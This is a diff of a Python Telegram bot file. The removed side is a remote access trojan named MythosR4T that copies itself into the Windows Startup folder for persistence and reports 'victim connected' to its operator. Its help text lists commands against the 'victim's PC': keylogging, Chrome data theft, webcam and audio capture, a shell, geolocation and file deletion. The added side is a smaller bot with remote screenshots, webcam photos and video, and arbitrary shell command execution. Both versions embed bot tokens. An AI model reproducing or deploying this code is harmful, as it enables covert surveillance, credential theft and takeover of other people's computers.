@@ -1,267 +1,124 @@
-# Author        : myth-dev
-# GitHub        : https://github.com/mython-dev/
-# Instagram     : @thehackerworld_ && @ myth.dev_
-# Telegram      : @myth_dev
-# Date          : 06.30.2023
-# Main Language : Python
-# Version Rat   : MythosR4T 1.0
-
-from aiogram import Bot, Dispatcher, types, executor
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
-import sys
+import telebot
+import psutil
+import platform
+import subprocess
+import cv2
+import pyautogui
 import os
+import time
 
-from libs.commands import *
+# 🔑 Вставь сюда свой НОВЫЙ токен от BotFather
+TOKEN = "7226259675:AAFoRNJYdsrJ_IxpSfjjc_mkKqaJqKJ3jb0"
+bot = telebot.TeleBot(TOKEN)
 
-from logs.chrome import chrome_commmand
-
-Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
-Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
-user_path = os.path.expanduser('~') # Путь к папке пользователя
-
-ID = 7702740197
-if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
-        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
-
-bot = Bot(token="8492350127:AAHKXC87-_7h16V-3XbaqkM5mnrAZRtGwp4")
-dp = Dispatcher(bot)
-
-help_text = """Что можете выполнить в жертве ПК:\n
-/help - Отправка всех доступных комманд.
-/reboot - Перезагрузить клиентский ПК.
-/shutdown - Выключить клиентский ПК.
-/drivers - Все драйвера ПК.
-/kill - Убить системную задачу.
-/sysinfo - Основная информация о системе.
-/tasklist - Все системные задачи.
-/monitors - Получить список мониторов.
-/turnoff_mon - Выключить монитор.
-/turnon_mon - Включить монитор.
-/volumeup - Увеличить громкость до 100%.
-/volumedown - Уменьшить громкость до 0%.
-/sendmessage - Отправить сообщение с текстом.
-/setwallpaper - Изменить обой.
-/open_link - Открыть ссылку в браузере.
-/pwd - Получить текущий рабочий каталог.
-/cd - Изменить каталог.
-/dir - Получить все файлы текущего каталога.
-/makedir - Создать директорию.
-/rmdir - Удалить директорию.
-/rmfile - Удалить файл.
-/searchfile - Искать файл в системе.
-/screenshot- Скриншот.
-/chrome - Все данные Хрома.
-/webcam_snap - Сделать фото с веб-камеры.
-/shell - Cmd.exe
-/download - Cкачать файл.
-/geolocate - Получить примерное местонахождение жертвы.
-/keylogger_start - Запустить Keylogger.
-/send_logs_keylogger - Отправить логи кейлоггера.
-/keylogger_stop - Остановить Keylogger.
-/audio - Запись аудио с пк жертвы.
-/disablekeyboard - Отключить клавиатуру.
-/enablekeyboard - Включить клавиатуру, Работает багом иногда не включает клавитуру...
-/disablemouse - Отключить мышку.
-/enablemouse - Включить мышку.
-/clipboard - Посмотреть буфер обмена.
-/alt_f4 - Закрыть окно.
-/runprogramm - Запустить программу.
-/voice - Если ты скинешь мне голосовое сообщение я открою его у жертвы
+# 📋 Список команд
+COMMANDS = """
+Доступные команды:
+/start - список команд
+/info - информация о системе
+/screenshot - сделать скриншот
+/photo - фото с вебки
+/video - видео с вебки (5 сек)
+/run <файл> - запустить программу
+/stop <имя процесса> - завершить процесс
+/open_url <ссылка> - открыть сайт
 """
 
-async def on_startup(_):
-    keyboard = InlineKeyboardMarkup()
-    next_ = InlineKeyboardButton(text='Продолжить.', callback_data='next')
-    keyboard.add(next_)
-    await bot.send_message(chat_id=ID, text='Жертва подключилась...', reply_markup=keyboard)
+# 🟢 /start
+@bot.message_handler(commands=['start'])
+def start(message):
+    bot.send_message(message.chat.id, COMMANDS)
 
-@dp.message_handler(commands=['start'])
-async def start_commands(message: types.Message):
-    if message.from_user.id == int(7702740197):
-        await bot.send_message(chat_id=ID, text='Нажми на /help')
-    else: 
-        await bot.send_message(message.chat.id, 'Вы не явлейтесь админом!!!')
+# 🖥 Системная информация
+@bot.message_handler(commands=['info'])
+def sys_info(message):
+    uname = platform.uname()
+    cpu = psutil.cpu_percent()
+    ram = psutil.virtual_memory().percent
+    disk = psutil.disk_usage('/').percent
+    info = f"""
+💻 Система: {uname.system} {uname.release}
+🖥 Процессор: {uname.processor}
+⚡ CPU: {cpu}%
+📊 RAM: {ram}%
+💾 Диск: {disk}%
+"""
+    bot.send_message(message.chat.id, info)
 
+# 📸 Скриншот
+@bot.message_handler(commands=['screenshot'])
+def screenshot(message):
+    screenshot = pyautogui.screenshot()
+    file_path = "screenshot.png"
+    screenshot.save(file_path)
+    with open(file_path, 'rb') as photo:
+        bot.send_photo(message.chat.id, photo)
+    os.remove(file_path)
 
-@dp.message_handler(commands=['help'])
-async def command_help(message: types.Message):
-    if message.from_user.id == int(7702740197):
-        await bot.send_message(chat_id=ID, text=help_text)
-    else: 
-        await bot.send_message(message.chat.id, 'Вы не явлейтесь админом!!!')
+# 📷 Фото с вебки
+@bot.message_handler(commands=['photo'])
+def photo(message):
+    cam = cv2.VideoCapture(0)
+    ret, frame = cam.read()
+    file_path = "photo.png"
+    if ret:
+        cv2.imwrite(file_path, frame)
+        with open(file_path, 'rb') as img:
+            bot.send_photo(message.chat.id, img)
+        os.remove(file_path)
+    cam.release()
 
-@dp.callback_query_handler(lambda c: c.data == 'next')
-async def all_commands(message: types.Message):
-    await bot.send_message(chat_id=ID, text=help_text)
+# 🎥 Видео с вебки
+@bot.message_handler(commands=['video'])
+def video(message):
+    cam = cv2.VideoCapture(0)
+    fourcc = cv2.VideoWriter_fourcc(*'XVID')
+    out = cv2.VideoWriter('video.avi', fourcc, 20.0, (640,480))
+    start_time = time.time()
 
-    @dp.message_handler(commands=['reboot'])
-    async def reboot_handler(message: types.Message):
-        await reboot_command(message)
+    while(int(time.time() - start_time) < 5):
+        ret, frame = cam.read()
+        if ret:
+            out.write(frame)
+        else:
+            break
 
-    @dp.message_handler(commands=['shutdown'])
-    async def shutdown_handler(message: types.Message):
-        await shutdown_command(message)
+    cam.release()
+    out.release()
 
-    @dp.message_handler(commands=['drivers'])
-    async def drivers_handler(message: types.Message):
-        await driver_command(message)
+    with open("video.avi", 'rb') as vid:
+        bot.send_video(message.chat.id, vid)
+    os.remove("video.avi")
 
-    @dp.message_handler(commands=['kill'])
-    async def kill_handler(message: types.Message):
-        await kill_command(message)
+# 🚀 Запуск программ
+@bot.message_handler(commands=['run'])
+def run_file(message):
+    try:
+        file = message.text.split(" ", 1)[1]
+        subprocess.Popen(file, shell=True)
+        bot.send_message(message.chat.id, f"✅ Запустил: {file}")
+    except:
+        bot.send_message(message.chat.id, "⚠ Ошибка запуска")
 
-    @dp.message_handler(commands=['sysinfo'])
-    async def sysinfo_handler(message: types.Message):
-        await sysinfo_command(message)
+# ❌ Остановка процессов
+@bot.message_handler(commands=['stop'])
+def stop_process(message):
+    try:
+        proc = message.text.split(" ", 1)[1]
+        subprocess.call(f"taskkill /f /im {proc}.exe", shell=True)
+        bot.send_message(message.chat.id, f"🛑 Процесс {proc} завершён")
+    except:
+        bot.send_message(message.chat.id, "⚠ Ошибка")
 
-    @dp.message_handler(commands=['tasklist'])
-    async def tasklist_handler(message: types.Message):
-        await tasklist_command(message)
+# 🌐 Открыть сайт
+@bot.message_handler(commands=['open_url'])
+def open_url(message):
+    try:
+        url = message.text.split(" ", 1)[1]
+        subprocess.Popen(f'start {url}', shell=True)
+        bot.send_message(message.chat.id, f"🌍 Открыл сайт: {url}")
+    except:
+        bot.send_message(message.chat.id, "⚠ Ошибка")
 
-    @dp.message_handler(commands=['monitors'])
-    async def monitors_handler(message: types.Message):
-        await send_list_monitor(message)
-
-    @dp.message_handler(commands=['turnoff_mon'])
-    async def turnoff_mon_handler(message: types.Message):
-        await turnoffmon_command(message)
-
-    @dp.message_handler(commands=['turnon_mon'])
-    async def turnon_mon_handler(message: types.Message):
-        await turnonmon_command(message)
-
-    @dp.message_handler(commands=['volumeup'])
-    async def volumeup_handler(message: types.Message):
-        await volumeup_command(message)
-
-    @dp.message_handler(commands=['volumedown'])
-    async def volumedown_handler(message: types.Message):
-        await volumedown_command(message)
-
-    @dp.message_handler(commands=['sendmessage'])
-    async def sendmessage_handler(message: types.Message):
-        await sendmessage_command(message)
-
-    @dp.message_handler(commands=['setwallpaper'])
-    async def setwallpaper_handler(message: types.Message):
-        await setwallpaper_command(message)
-
-    @dp.message_handler(commands=['open_link'])
-    async def open_link_handler(message: types.Message):
-        await open_link_command(message)
-
-    @dp.message_handler(commands=['pwd'])
-    async def pwd_handler(message: types.Message):
-        await pwd_command(message)
-
-    @dp.message_handler(commands=['cd'])
-    async def cd_handler(message: types.Message):
-        await cd_command(message)
-
-    @dp.message_handler(commands=['dir'])
-    async def dir_handler(message: types.Message):
-        await dir_command(message)
-
-    @dp.message_handler(commands=['makedir'])
-    async def makedir(message: types.Message):
-        await makedir_command(message) 
-
-    @dp.message_handler(commands=['rmdir'])
-    async def rmdir(message: types.Message):
-        await rmdir_command(message)
-
-    @dp.message_handler(commands=['rmfile'])
-    async def rmfile(message: types.Message):
-        await rmfile_command(message)
-
-    @dp.message_handler(commands=['searchfile'])
-    async def searchfile(message: types.Message):
-        await searchfile_command(message)     
-
-    @dp.message_handler(commands=['screenshot'])
-    async def screenshot(message: types.Message):
-        await screenshot_command(message)     
-
-    @dp.message_handler(commands=['webcam_snap'])
-    async def webcam_snap_handler(message: types.Message):
-        await webcam_snap_command(message)
-
-    @dp.message_handler(commands=['shell'])
-    async def shell_handler(message: types.Message):
-        await shell(message)
-
-    @dp.message_handler(commands=['download'])
-    async def download(message: types.Message):
-        await download_file(message)  
-
-    @dp.message_handler(commands=['geolocate'])
-    async def geolocate(message: types.Message):
-        await geolocate_command(message) 
-
-    @dp.message_handler(commands=['audio'])
-    async def audio_handler(message: types.Message):
-        await audio_command(message)
-
-    @dp.message_handler(commands=['disablekeyboard'])
-    async def disablekeyboard_handler(message: types.Message):
-        await disablekeyboard_command(message)
-
-    @dp.message_handler(commands=['enablekeyboard'])
-    async def enablekeyboard_handler(message: types.Message):
-        await enablekeyboard_command(message)
-
-    @dp.message_handler(commands=['disablemouse'])
-    async def disablemouse_handler(message: types.Message):
-        await disablemouse_command(message)
-
-    @dp.message_handler(commands=['enablemouse'])
-    async def enablemouse_handler(message: types.Message):
-        await enablemouse_command(message)
-
-    @dp.message_handler(commands=['clipboard'])
-    async def clipboard(message: types.Message):
-        await clipboard_command(message)
-
-    @dp.message_handler(commands=['alt_f4'])
-    async def alt_f4(message: types.Message):
-        await f4(message)   
-
-    @dp.message_handler(commands=['runprogramm'])
-    async def runprogramm_handler(message: types.Message):
-        await runprogramm_command(message) 
-
-    @dp.message_handler(commands=['chrome'])
-    async def chrome_handler(message: types.Message):
-        await chrome_commmand(message)
-
-    @dp.message_handler(commands=['keylogger_start'])
-    async def keylogger_start_handler(message: types.Message):
-        await start_keylogger(message)
-    
-    @dp.message_handler(commands=['keylogger_stop'])
-    async def keylogger_stop_handler(message: types.Message):
-        await stop_keylogger(message)  
-
-    @dp.message_handler(commands=['send_logs_keylogger'])
-    async def send_logs_keylogger_handler(message: types.Message):
-        await send_logs(message)      
-
-    @dp.message_handler(content_types=['voice'])
-    async def audio(message: types.Message):
-        try:
-            await bot.send_message(chat_id=ID, text='Пожалуйста, не отправляйте аудио длиннее 60 секунд.')
-            await bot.send_message(chat_id=ID, text="Сейчас запущу...")
-            file_id = message.voice.file_id
-            file = await bot.get_file(file_id)
-            file_path = file.file_path
-            await bot.download_file(file_path, message.voice.file_unique_id + '.ogg')
-            os.system(message.voice.file_unique_id + '.ogg')
-            await bot.send_message(chat_id=ID, text='Успешно запустил твоё голосовое сообщение ✅')
-            import time
-            time.sleep(60)
-            os.remove(message.voice.file_unique_id + '.ogg')
-        except Exception as e:
-            await bot.send_message(ID, e)
-
-if __name__ == "__main__":
-    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
+print("🤖 Бот запущен...")
+bot.polling()
